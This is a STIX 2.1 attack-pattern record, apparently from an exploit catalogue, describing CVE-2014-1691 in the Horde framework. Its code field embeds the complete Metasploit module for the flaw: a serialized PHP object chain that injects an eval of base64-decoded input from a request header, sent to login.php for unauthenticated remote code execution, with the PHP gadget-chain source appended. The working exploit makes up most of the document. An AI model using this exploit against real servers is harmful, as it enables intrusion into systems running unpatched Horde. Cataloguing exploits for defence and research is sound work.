{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cb11cb2c-98b1-4f37-9086-49932613d8c1",
    "created": "2024-08-14T17:12:46.899144Z",
    "modified": "2024-08-14T17:12:46.899148Z",
    "name": "Horde Framework Unserialize PHP Code Execution",
    "description": " This module exploits a php unserialize() vulnerability in Horde <= 5.1.1 which could be abused to allow unauthenticated users to execute arbitrary code with the permissions of the web server. The dangerous unserialize() exists in the 'lib/Horde/Variables.php' file. The exploit abuses the __destruct() method from the Horde_Kolab_Server_Decorator_Clean class to reach a dangerous call_user_func() call in the Horde_Prefs class. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/horde_unserialize_exec.rb",
            "external_id": "horde_unserialize_exec.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-1691"
        },
        {
            "source_name": "reference",
            "url": "http://karmainsecurity.com/exploiting-cve-2014-1691-horde-framework-php-object-injection"
        },
        {
            "source_name": "reference",
            "url": "https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=737149"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/horde/horde/commit/da6afc7e9f4e290f782eca9dbca794f772caccb3"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Horde Framework Unserialize PHP Code Execution',\n      'Description'    => %q{\n        This module exploits a php unserialize() vulnerability in Horde <= 5.1.1 which could be\n        abused to allow unauthenticated users to execute arbitrary code with the permissions of\n        the web server. The dangerous unserialize() exists in the 'lib/Horde/Variables.php' file.\n        The exploit abuses the __destruct() method from the Horde_Kolab_Server_Decorator_Clean\n        class to reach a dangerous call_user_func() call in the Horde_Prefs class.\n      },\n      'Author'         =>\n        [\n          'EgiX', # Exploitation technique and Vulnerability discovery (originally reported by the vendor)\n          'juan vazquez' # Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2014-1691' ],\n          [ 'URL', 'http://karmainsecurity.com/exploiting-cve-2014-1691-horde-framework-php-object-injection' ],\n          [ 'URL', 'https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=737149' ],\n          [ 'URL', 'https://github.com/horde/horde/commit/da6afc7e9f4e290f782eca9dbca794f772caccb3' ]\n        ],\n      'Privileged'     => false,\n      'Platform'       => ['php'],\n      'Arch'           => ARCH_PHP,\n      'Payload'        =>\n        {\n          'DisableNops' => true\n        },\n      'Targets'        => [ ['Horde 5', { }], ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2013-06-27'\n      ))\n\n      register_options(\n        [\n          OptString.new('TARGETURI', [ true, \"The base path to Horde\", \"/horde/\"])\n        ])\n  end\n\n  def check\n    flag = rand_text_alpha(rand(10)+20)\n    res = send_request_exploit(\"print #{flag};die;\")\n    if res and res.body and res.body.to_s =~ /#{flag}/\n      return Exploit::CheckCode::Vulnerable\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    print_status(\"Testing injection...\")\n    unless check == Exploit::CheckCode::Vulnerable\n      fail_with(Failure::NotVulnerable, \"#{peer} - Target isn't vulnerable, exiting...\")\n    end\n\n    print_status(\"Exploiting the unserialize()...\")\n    send_request_exploit(payload.encoded)\n  end\n\n  def send_request_exploit(p)\n    php_injection = \"eval(base64_decode($_SERVER[HTTP_CMD]));die();\"\n\n    payload_serialized = \"O:34:\\\"Horde_Kolab_Server_Decorator_Clean\\\":2:{s:43:\\\"\\x00Horde_Kolab_Server_Decorator_Clean\\x00_server\\\";\"\n    payload_serialized << \"O:20:\\\"Horde_Prefs_Identity\\\":2:{s:9:\\\"\\x00*\\x00_prefs\\\";O:11:\\\"Horde_Prefs\\\":2:{s:8:\\\"\\x00*\\x00_opts\\\";a:1:{s:12:\\\"sizecallback\\\";\"\n    payload_serialized << \"a:2:{i:0;O:12:\\\"Horde_Config\\\":1:{s:13:\\\"\\x00*\\x00_oldConfig\\\";s:#{php_injection.length}:\\\"#{php_injection}\\\";}i:1;s:13:\\\"readXMLConfig\\\";}}\"\n    payload_serialized << \"s:10:\\\"\\x00*\\x00_scopes\\\";a:1:{s:5:\\\"horde\\\";O:17:\\\"Horde_Prefs_Scope\\\":1:{s:9:\\\"\\x00*\\x00_prefs\\\";a:1:{i:0;i:1;}}}}\"\n    payload_serialized << \"s:13:\\\"\\x00*\\x00_prefnames\\\";a:1:{s:10:\\\"identities\\\";i:0;}}s:42:\\\"\\x00Horde_Kolab_Server_Decorator_Clean\\x00_added\\\";a:1:{i:0;i:1;}}\"\n\n    send_request_cgi(\n      {\n        'uri'       => normalize_uri(target_uri.path.to_s, \"login.php\"),\n        'method'    => 'POST',\n        'vars_post' => {\n          '_formvars' => payload_serialized\n        },\n        'headers' => {\n          'Cmd' => Rex::Text.encode_base64(p)\n        }\n      })\n  end\nend\n\n=begin\n\nPHP chain by EgiX: http://karmainsecurity.com/exploiting-cve-2014-1691-horde-framework-php-object-injection\n\nclass Horde_Config\n{\n   protected $_oldConfig = \"phpinfo();die;\";\n}\n\nclass Horde_Prefs_Scope\n{\n   protected $_prefs = array(1);\n}\n\nclass Horde_Prefs\n{\n   protected $_opts, $_scopes;\n\n   function __construct()\n   {\n      $this->_opts['sizecallback'] = array(new Horde_Config, 'readXMLConfig');\n      $this->_scopes['horde'] = new Horde_Prefs_Scope;\n   }\n}\n\nclass Horde_Prefs_Identity\n{\n   protected $_prefs, $_prefnames;\n\n   function __construct()\n   {\n      $this->_prefs = new Horde_Prefs;\n      $this->_prefnames['identities'] = 0;\n   }\n}\n\nclass Horde_Kolab_Server_Decorator_Clean\n{\n   private $_server, $_added = array(1);\n\n   function __construct()\n   {\n      $this->_server = new Horde_Prefs_Identity;\n   }\n}\n\n$popchain = serialize(new Horde_Kolab_Server_Decorator_Clean);\n\n=end\n",
    "x_mitre_disclosure_date": "2013-06-27",
    "x_mitre_platforms": [
        "['php']"
    ]
}